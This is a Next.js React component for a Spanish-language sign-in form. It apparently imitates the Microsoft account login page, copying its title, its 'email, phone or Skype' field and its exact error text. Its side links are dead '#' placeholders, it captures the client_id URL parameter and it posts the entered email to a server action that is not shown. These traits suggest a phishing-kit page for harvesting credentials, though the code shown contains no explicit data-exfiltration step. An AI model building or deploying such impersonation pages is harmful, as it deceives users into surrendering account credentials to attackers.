"use client";

import Link from "next/link";
import { useEffect, useState } from "react";
import { useSearchParams } from "next/navigation";
import { useFormState, useFormStatus } from "react-dom";

import { actionGetUserLogin } from "../lib/actions";
import styles from "./styles/Home.module.css";

export default function EmailForm() {
  const searchParams = useSearchParams();
  const initialState = {
    message: "NONE",
    params: searchParams.toString(),
  };

  const [state, formAction] = useFormState(actionGetUserLogin, initialState);
  const [error, setError] = useState(false);
  const { pending } = useFormStatus();

  useEffect(() => {
    if (state?.message == "ERROR") {
      setError(true);
    }
  }, [state]);

  return (
    <div className="flex flex-col gap-3">
      <h1 className={styles["form-title"]}>Iniciar sesión</h1>

      {error ? (
        <div className={styles["form-error-text"]}>
          Escribe una dirección de correo electrónico, un número de teléfono o
          un nombre de Skype válidos.
        </div>
      ) : null}

      <form action={formAction}>
        <input
          id="email-field"
          className={`${styles["form-inputPrimary"]} ${
            error && styles["form-error"]
          }`}
          type="text"
          aria-required="true"
          autoComplete="username"
          maxLength={113}
          name="email"
          placeholder="Correo electrónico, teléfono o Skype"
          onInput={(event) => {
            const input = event.target as HTMLInputElement;
            input.value ? setError(false) : setError(true);
          }}
        />
        <input
          type="hidden"
          name="id"
          defaultValue={searchParams.get("client_id") || ""}
        />

        <div className="flex flex-col gap-4 text-[13px]">
          <p>
            ¿No tiene una cuenta?{" "}
            <Link className={styles["form-linkPrimary"]} href="#">
              Cree una.
            </Link>
          </p>

          <div>
            <Link className={styles["form-linkPrimary"]} href="#">
              ¿No puede acceder a su cuenta?
            </Link>
          </div>
        </div>

        <div className={styles["form-btnContainer"]}>
          <button
            aria-disabled={pending}
            type="submit"
            className={styles["form-btnPrimary"]}
          >
            Siguiente
          </button>
        </div>
      </form>
    </div>
  );
}
